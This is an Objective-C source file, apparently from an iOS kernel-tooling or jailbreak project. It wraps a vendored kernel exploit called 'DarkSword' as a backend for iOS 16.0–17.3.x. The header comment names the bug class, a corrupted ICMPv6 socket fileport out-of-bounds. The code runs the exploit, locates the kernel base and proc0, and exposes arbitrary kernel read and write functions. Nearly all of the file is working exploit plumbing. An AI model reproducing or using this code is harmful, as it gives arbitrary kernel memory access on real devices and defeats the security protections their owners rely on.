//
//  ke_backend_darksword.m — lara DarkSword vendored exploit as a krw backend
//
//  DarkSword (lara/kexploit, vendored under vendor/darksword) provides clean
//  arbitrary kernel read/write through corrupted ICMPv6 socket fileports
//  (getsockopt/setsockopt OOB). Unlike kfd/landa it:
//    - needs no PUAF, no memory hog, no /dev/aes_0 corruption
//    - leaves no poisoned physical pages behind (stable overnight)
//    - is repeatable within the same boot
//  so it is the preferred backend for iOS 16.0–17.3.x.
//
#include "ke_internal.h"

// vendored darksword headers
#include "darksword.h"
#include "../vendor/darksword/offsets.h"
#include "utils.h"
#include "xpaci.h"

static int keDsInit(const KEConfig *config)
{
    (void)config;

    // Set all off_* globals for the running OS/SoC (pure sysctl + UserDefaults).
    offsets_init();

    if (!off_inpcb_inp_socket || !off_inpcb_inp_list_le_next || !off_socket_so_proto
        || !off_protosw_pr_input) {
        KE_LOG("darksword: offsets_init did not set socket offsets");
        return KE_ERR_OFFSETS_MISSING;
    }

    KE_LOG("darksword: running exploit (socket OOB race)...");
    int rc = ds_run();
    if (rc != 0 || !ds_is_ready()) {
        KE_LOG("darksword: ds_run failed rc=%d ready=%d", rc, ds_is_ready());
        return KE_ERR_EXPLOIT_FAILED;
    }

    uint64_t kbase = ds_get_kernel_base();
    uint64_t ourProc = ds_get_our_proc();
    uint64_t ourTask = ds_get_our_task();
    KE_LOG("darksword: ready, kernel_base=0x%llx our_proc=0x%llx our_task=0x%llx",
           kbase, ourProc, ourTask);

    // Runtime proc layout for the shared ke_proc.c walker:
    // iOS 16.6: p_list @ 0x0, p_ro @ 0x18, pr_task @ 0x8 inside proc_ro
    gKeRuntimeProcPid    = off_proc_p_pid;
    gKeRuntimeProcProcRo = off_proc_p_proc_ro;
    gKeRuntimeProcTask   = off_proc_ro_pr_task;   // offset INSIDE proc_ro
    gKeRuntimeProcObjectSize = 0;

    // Find proc0 by walking the circular p_list from our own proc.
    {
        uint64_t proc = ourProc;
        for (int i = 0; i < 1024 && proc; i++) {
            int32_t curPid = 0;
            ds_kreadbuf(proc + off_proc_p_pid, &curPid, sizeof(curPid));
            if (curPid == 0) {
                gKeKfdKernelProc = proc;
                break;
            }
            uint64_t next = 0;
            ds_kreadbuf(proc + off_proc_p_list_le_next, &next, sizeof(next));
            next = keDsUnsign(next);
            if (!next || next == ourProc) break;
            proc = next;
        }
        KE_LOG("darksword: proc0=0x%llx (p_list walk)", gKeKfdKernelProc);
        if (!gKeKfdKernelProc) {
            KE_LOG("darksword: proc0 not found — extmod zeroing will fall back to kobject path");
        }
    }
    gKeKfdCurrentProc = ourProc;

    // sanity: read the kernel Mach-O magic through the new primitive
    uint64_t magic = 0;
    ds_kreadbuf(kbase, &magic, sizeof(magic));
    if ((magic & 0xFFFFFFFFULL) != 0xfeedfacfULL) {
        KE_LOG("darksword: kernel sanity read failed");
        return KE_ERR_EXPLOIT_FAILED;
    }
    return KE_OK;
}

static void keDsDeinit(void)
{
    // Nothing to free: the OOB sockets leak intentionally and keep the
    // primitive alive for the process lifetime.
}

static int keDsReadBuf(uint64_t kaddr, void *out, size_t size)
{
    if (!out || !size) return -1;
    ds_kreadbuf(kaddr, out, size);
    return 0;
}

static int keDsWriteBuf(uint64_t kaddr, const void *in, size_t size)
{
    if (!in || !size) return -1;
    ds_kwritebuf(kaddr, in, size);
    return 0;
}

static uint64_t keDsVtophys(uint64_t kaddr)
{
    (void)kaddr;
    return 0;
}

const KEBackendOps keBackendDarksword = {
    .name = "darksword",
    .id = KE_BACKEND_DARKSWORD,
    .init = keDsInit,
    .deinit = keDsDeinit,
    .kreadbuf = keDsReadBuf,
    .kwritebuf = keDsWriteBuf,
    .vtophys = keDsVtophys,
};
